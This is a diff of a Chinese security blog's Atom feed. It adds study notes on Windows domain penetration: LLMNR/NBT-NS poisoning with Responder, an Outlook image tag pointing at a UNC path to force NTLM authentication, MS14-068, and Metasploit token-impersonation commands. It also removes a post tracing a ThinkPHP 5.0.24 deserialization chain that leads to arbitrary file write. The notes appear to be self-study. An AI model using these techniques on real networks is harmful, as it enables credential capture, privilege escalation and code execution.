@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chriskalix.github.io</id>
     <title>chriskali&apos;s blog</title>
-    <updated>2020-06-26T09:06:40.979Z</updated>
+    <updated>2020-06-27T07:24:53.081Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chriskalix.github.io"/>
     <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
@@ -10,6 +10,99 @@
     <logo>https://chriskalix.github.io/images/avatar.png</logo>
     <icon>https://chriskalix.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[域渗透基础知识（三）- 思维导图补充]]></title>
+        <id>https://chriskalix.github.io/post/3dogm6EPG/</id>
+        <link href="https://chriskalix.github.io/post/3dogm6EPG/">
+        </link>
+        <updated>2020-06-27T07:24:14.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>这段时间看内网基础的时候，看到一个比较好的脑图，忘记从哪里抄来的了...不过作者写的很好，我就跟着梳理一下</p>
+</blockquote>
+<h2 id="思维导图">思维导图</h2>
+<figure data-type="image" tabindex="1"><img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5C%E8%84%91%E5%9B%BE.png" alt="脑图" loading="lazy"></figure>
+<h2 id="分类梳理">分类梳理</h2>
+<blockquote>
+<p>对于已经了解过的就不重复梳理</p>
+</blockquote>
+<h3 id="ntlm系列">NTLM系列</h3>
+<h4 id="中间人">中间人</h4>
+<blockquote>
+<p>Net-NTLM可通过中间人+hashcat破解</p>
+</blockquote>
+<h5 id="前置知识">前置知识</h5>
+<h6 id="中间人相关">中间人相关</h6>
+<p>LLMNR（Link-Local Multicast Name Resolution）：</p>
+<ul>
+<li>主机在自己的内部名称缓存中查询名称。如果在缓存中没有找到名称，那么主机就会向自己配置的主DNS服务器发送查询请求。如果主机没有收到回应或收到了错误信息，主机还会尝试搜索配置的备用DNS服务器。如果主机没有配置DNS服务器，或者如果在连接DNS服务器的时候没有遇到错误但失败了，那么名称解析会失败，并转为使用LLMNR</li>
+<li>主机通过用户数据报协议(UDP)发送多播查询，查询主机名对应的IP地址，这个查询会被限制在本地子网(也就是所谓的链路局部)内</li>
+<li>链路局部范围内每台支持LLMNR，并且被配置为响应传入查询的主机在收到这个查询请求后，会将被查询的名称和自己的主机名进行比较。如果没有找到匹配的主机名，那么计算机就会丢弃这个查询。如果找到了匹配的主机名，这台计算机会传输一条包含了自己IP地址的单播信息给请求该查询的主机</li>
+</ul>
+<p><strong>简单来说，DNS名称服务器请求失败时，就会通过链路本地多播名称解析（LLMNR）以及Net-BIOS名称服务，试图在本地进行名称解析</strong></p>
+<p>NBT-NS（Netbios Name Service）：</p>
+<ul>
+<li>与上述基本相同</li>
+</ul>
+<p><strong>二者区别</strong>：</p>
+<ul>
+<li>NetBIOS基于广播，而LLMNR基于多播</li>
+<li>NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有WindowsVista和更高版本才支持LLMNR</li>
+<li>LLMNR还支持IPv6，而NetBIOS不支持，因此，在启用了IPv6，但对IPv6管理不如IPv4那样细致的复杂网络中，就可能发生更广泛的攻击</li>
+</ul>
+<h6 id="挑战认证相关">挑战认证相关</h6>
+<p>SSPI（Security Service Provider Interface）：</p>
+<p>​	这是Windows定义的一套接口，定义了安全有关的函数功能，包括但是不限于</p>
+<ul>
+<li>身份认证机制</li>
+<li>为其他协议提供的Session security机制</li>
+<li>...</li>
+</ul>
+<p>SSP（Security Service Provider）：</p>
+<p>​	SSPI的实现者，微软实现了以下的SSP</p>
+<ul>
+<li>NTLM SSP</li>
+<li>Kerberos</li>
+<li>Cred SSP</li>
+<li>...</li>
+</ul>
+<h5 id="从理论上理解">从理论上理解</h5>
+<p>使用工具 <code>Responder</code>，在内网环境下，假设用户访问一个不存在的UNC路径，则最后会在局域网内发送LLMNR（或者NBNS？）请求，<code>Responder</code> 的作用就是回复这些请求，那么用户和攻击机（即<code>Responder</code>所在机器）发起质询和响应，可以截获到NLTMv2 SSP。</p>
+<p>在本机测试后，即使弹出了登录框，输入密码后还是NTLMv2 SSP，因为是NTLM认证呀...可能和设置有关吧（其他文章里直接获取了明文密码），埋一个坑，后续再看。</p>
+<h6 id="缺点">缺点</h6>
+<ol>
+<li>感觉触发的概率不是很大</li>
+<li>跑的不是NTLM Hash，是NTLM-v1/v2 Hash，只能通过本地用Hashcat跑，比硬件</li>
+</ol>
+<h5 id="参考文章">参考文章</h5>
+<p><a href="https://blog.csdn.net/wxh0000mm/article/details/105997105">发起NTLM</a></p>
+<ul>
+<li>Outlook ：<code>&lt;img src=&quot;\\172.16.100.1\outlook&quot;&gt;</code></li>
+<li>OFFICE ：钓鱼可用</li>
+<li>Mysql：load_file同样支持unc</li>
+</ul>
+<h3 id="kerberos系列">Kerberos系列</h3>
+<h4 id="ms14-068">MS14-068</h4>
+<p>首先补丁为<code>kb3011780</code><br>
+原理：用户在向KDC申请TGT的时候，申明自己有域管理员权限，而KDC没有校验该票据的签名，导致权限提升。-&gt;从&lt;&lt;内网安全攻防&gt;&gt;摘录<br>
+但是思考了以下觉得不对啊，看Kerberos认证里，第一步的时候如果申请了，AS会校验用户hash。查阅其他人的文章，找到如下：<br>
+Client向AS(KDC)发送KRB_AS_REQ请求时，申请一张不包含PAC的TGT票据。并在Client向TGS发送KRB_TGS_REQ请求时，重新构造高权限TGT及PAC发送给TGS，TGS会返回一个新的TGT。<br>
+那么发现了，其实申请TGT是第二部，书里也写了，只是我没看到...</p>
+<h3 id="token系列">Token系列</h3>
+<p>分类：</p>
+<ul>
+<li>Delegation Tokens授权令牌</li>
+<li>Impersonation Tokens模拟令牌</li>
+</ul>
+<p><code>注：用户注销后会切换至模拟令牌，不会注销</code></p>
+<p>我认为这个是本地登录过administrator的情况才有？</p>
+<p>常见的<code>msf</code>操作：</p>
+<ul>
+<li><code>load incognito</code></li>
+<li><code>list_tokens -u</code></li>
+<li><code>impoersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code>（这里为上述列举出的token，如果存在就直接提权成功）</li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[域渗透基础知识(二)-PTH&PTT]]></title>
         <id>https://chriskalix.github.io/post/hPs3dwq1p/</id>
@@ -1488,249 +1581,6 @@ $f-&gt;invoke($_POST[2333]);
 <li>参数名位置(变长参数)</li>
 <li>控制字符(重点)</li>
 <li>PHP标签</li>
-</ol>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Thinkphp 5.0.24 反序列化链分析]]></title>
-        <id>https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/</id>
-        <link href="https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/">
-        </link>
-        <updated>2020-06-14T04:13:42.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="具体分析">具体分析</h2>
-<blockquote>
-<p>这里非常的长，比较复杂，推荐两个文章<br>
-https://www.anquanke.com/post/id/196364#h2-5<br>
-http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/<br>
-这里主要是记录一下我跟着其他作者的文章分析的流程</p>
-</blockquote>
-<h3 id="入口点">入口点</h3>
-<p>首先找到 <code>__destruct</code> 选择<code>/thinkphp/library/think/process/pipes/Windows.php</code>下的，代码如下</p>
-<pre><code class="language-php">public function __destruct()
-{
-    $this-&gt;close();
-    $this-&gt;removeFiles();
-}
-</code></pre>
-<p>跟进<code>removeFiles()</code></p>
-<pre><code class="language-php">private function removeFiles()
-{
-    foreach ($this-&gt;files as $filename) {
-        if (file_exists($filename)) {
-            @unlink($filename);
-        }
-    }
-    $this-&gt;files = [];
-}
-</code></pre>
-<p>这边的<code>$files</code>可控，通过向<code>file_exists</code>任意类来触发<code>__toString()</code>，那么继续跟进寻找，在<code>/thinkphp/library/think/Model.php</code>中找到</p>
-<pre><code class="language-php">public function __toString() // 全局搜索__toString，找到这里，继续跟进
-{
-    return $this-&gt;toJson();
-}
-</code></pre>
-<pre><code class="language-php">public function toJson($options = JSON_UNESCAPED_UNICODE) // 调用toArray，继续跟进
-{
-    return json_encode($this-&gt;toArray(), $options);
-}
-</code></pre>
-<p>调用了<code>toArray()</code>，继续跟进，这边函数太长，提取出关键字段</p>
-<h3 id="分析难点">分析难点</h3>
-<p>这边分析是一个转折点，有几次赋值和方法，跟着别的作者文章看的时候觉得这里比较复杂</p>
-<pre><code class="language-php">public function toArray() // toArray这里是难点，仔细分析，因为我们的最终目的是执行__call，所以找到三处疑似利用点
-{
-    $item    = [];
-    $visible = [];
-    $hidden  = [];
-    ...
-    if (!empty($this-&gt;append)) {    // [*] 一: append不能为空 (这里append是可控的)
-        foreach ($this-&gt;append as $key =&gt; $name) {
-            if (is_array($name)) {  // [*] 二: $name是否是array (显然也是可控)
-                $relation   = $this-&gt;getAttr($key);
-                $item[$key] = $relation-&gt;append($name)-&gt;toArray();
-            } elseif (strpos($name, '.')) { // [*] 三: $name中是否包含 . ，包含的话进到这个循环
-                list($key, $attr) = explode('.', $name);
-                $relation   = $this-&gt;getAttr($key);
-                /** 第一处 **/
-                $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
-            } else {
-                $relation = Loader::parseName($name, 1, false); // $name可控，跟进函数(只是修改函数命名)
-                if (method_exists($this, $relation)) {          // [*] 四: 判断该方法是否存在于类中
-                    $modelRelation = $this-&gt;$relation(); // 调用该方法并赋值$modelRelation (这边找到的是getError函数)
-                    $value         = $this-&gt;getRelationData($modelRelation); //跟进getRelationData -&gt; 639行
-
-                    if (method_exists($modelRelation, 'getBindAttr')) { // [*] 五: 满足返回的函数存在getBindAttr
-                        /** 第二处 **/
-                        $bindAttr = $modelRelation-&gt;getBindAttr();
-                        if ($bindAttr) {                           // [*] 六: 值存在则继续
-                            foreach ($bindAttr as $key =&gt; $attr) {
-                                $key = is_numeric($key) ? $attr : $key;
-                                if (isset($this-&gt;data[$key])) {
-                                    throw new Exception('bind attr has exists:' . $key);
-                                } else {    // [*] 七: this-&gt;data[$key]没有赋值
-                                    /** 第三处 **/
-                                    $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
-                                }
-                            }
-                            continue;
-                        }
-                    }
-                    $item[$name] = $value;
-                } else {
-                    $item[$name] = $this-&gt;getAttr($name);
-                }
-            }
-        }
-    }
-    return !empty($item) ? $item : [];
-}
-</code></pre>
-<p>这里选用第三处作为跳转点，看到判断点四下有两个赋值操作</p>
-<pre><code class="language-php">$modelRelation = $this-&gt;$relation(); // 调用该方法并赋值$modelRelation (这边找到的是getError函数)
-$value         = $this-&gt;getRelationData($modelRelation); // 跟进getRelationData -&gt; 639行
-</code></pre>
-<p>这里的<code>$relation</code>是可控的，在<code>Model.php</code>下可控的函数选择 <code>getError</code></p>
-<pre><code class="language-php">public function getError()
-{
-    return $this-&gt;error; // 这里的error是可以控制的，所以选择这里
-}
-</code></pre>
-<p>然后跟进<code>$value=$this-&gt;getRelationData($modelRelation);</code></p>
-<pre><code class="language-php">protected function getRelationData(Relation $modelRelation)
-{
-    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) {
-        $value = $this-&gt;parent;
-    } else {
-        // 首先获取关联数据
-        if (method_exists($modelRelation, 'getRelation')) {
-            $value = $modelRelation-&gt;getRelation();
-        } else {
-            throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-&gt; getRelation');
-        }
-    }
-    return $value;
-}
-</code></pre>
-<p>首先要满足穿来的<code>$modelRelation</code>是Relation类，全局查找getRelation方法且为Relation类的类，找到 <code>HasOne``(/thinkphp/library/think/model/relation/HasOne.php)</code></p>
-<pre><code class="language-php">public function getRelation($subRelation = '', $closure = null)
-{
-    // 执行关联定义方法
-    $localKey = $this-&gt;localKey;
-    if ($closure) {
-        call_user_func_array($closure, [ &amp; $this-&gt;query]);
-    }
-    // 判断关联类型执行查询
-    $relationModel = $this-&gt;query
-        -&gt;removeWhereField($this-&gt;foreignKey)
-        -&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;$localKey)
-        -&gt;relation($subRelation)
-        -&gt;find();
-
-    if ($relationModel) {
-        $relationModel-&gt;setParent(clone $this-&gt;parent);
-    }
-
-    return $relationModel;
-}
-</code></pre>
-<p>可以看到满足条件，那么回到<code>Model.php</code>中继续跟进到第三处，执行到<code>Output.php</code>的__call函数，调用了block，跟进block</p>
-<pre><code class="language-php">protected function block($style, $message)
-{
-    $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;/$style&gt;&quot;);
-}
-</code></pre>
-<pre><code class="language-php">public function writeln($messages, $type = self::OUTPUT_NORMAL)
-{
-    $this-&gt;write($messages, true, $type);
-}
-</code></pre>
-<pre><code class="language-php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
-{
-    $this-&gt;handle-&gt;write($messages, $newline, $type);
-}
-</code></pre>
-<p>handle可控，看看有没有别的write，<code>/thinkphp/library/think/session/driver/Memcached.php</code>中有</p>
-<pre><code class="language-php">public function write($sessID, $sessData)
-{
-    return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);
-}
-</code></pre>
-<p>跟到了set跳板，全局找到<code>/thinkphp/library/think/cache/driver/File.php</code>下的set</p>
-<pre><code class="language-php">public function set($name, $value, $expire = null) // 跟到set
-{
-    if (is_null($expire)) {
-        $expire = $this-&gt;options['expire'];
-    }
-    if ($expire instanceof \DateTime) {
-        $expire = $expire-&gt;getTimestamp() - time();
-    }
-    $filename = $this-&gt;getCacheKey($name, true); // name可控，继续跟进
-    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
-        $first = true;
-    }
-    $data = serialize($value);
-    if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) {
-        //数据压缩
-        $data = gzcompress($data, 3);
-    }
-    $data   = &quot;&lt; ?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
-    $result = file_put_contents($filename, $data);
-    if ($result) {
-        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
-        clearstatcache();
-        return true;
-    } else {
-        return false;
-    }
-}
-</code></pre>
-<p>这里写入函数file_put_contents的$filename由getCacheKey来，跟进看</p>
-<pre><code class="language-php">protected function getCacheKey($name, $auto = false)
-{
-    $name = md5($name);
-    if ($this-&gt;options['cache_subdir']) {
-        // 使用子目录
-        $name = substr($name, 0, 2) . DS . substr($name, 2);
-    }
-    if ($this-&gt;options['prefix']) {
-        $name = $this-&gt;options['prefix'] . DS . $name;
-    }
-    $filename = $this-&gt;options['path'] . $name . '.php';//用协议
-    $dir      = dirname($filename);
-
-    if ($auto &amp;&amp; !is_dir($dir)) {
-        mkdir($dir, 0755, true);
-    }
-    return $filename;
-}
-</code></pre>
-<p>options是可控的，继续回去看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">与</mi></mrow><annotation encoding="application/x-tex">data与</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">与</span></span></span></span>value有关</p>
-<pre><code class="language-php">$data = serialize($value);
-...
-$data   = &quot;&lt;?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
-</code></pre>
-<p>这里的$value进来是true，所以这里不可控，但是写完后会调用setTagItem，这里在<code>Driver.php</code>里</p>
-<pre><code class="language-php">protected function setTagItem($name)
-{
-    if ($this-&gt;tag) {
-        $key       = 'tag_' . md5($this-&gt;tag);
-        $this-&gt;tag = null;
-        if ($this-&gt;has($key)) {
-            $value   = explode(',', $this-&gt;get($key));
-            $value[] = $name;
-            $value   = implode(',', array_unique($value));
-        } else {
-            $value = $name;
-        }
-        $this-&gt;set($key, $value, 0); //再次调用set
-    }
-}
-</code></pre>
-<p>可以看到这里的值都是可控的，再调用了set，所以可以成功的写入文件</p>
-<h2 id="总结">总结</h2>
-<ol>
-<li>windows下写poc的tips1，（感谢osword小刀师傅），写入&lt;?exp.php，相当于exp.php，另外一个https://xz.aliyun.com/t/7310。自行更改后即可~</li>
-<li>要找一个有写入权限的目录</li>
 </ol>
 ]]></content>
     </entry>
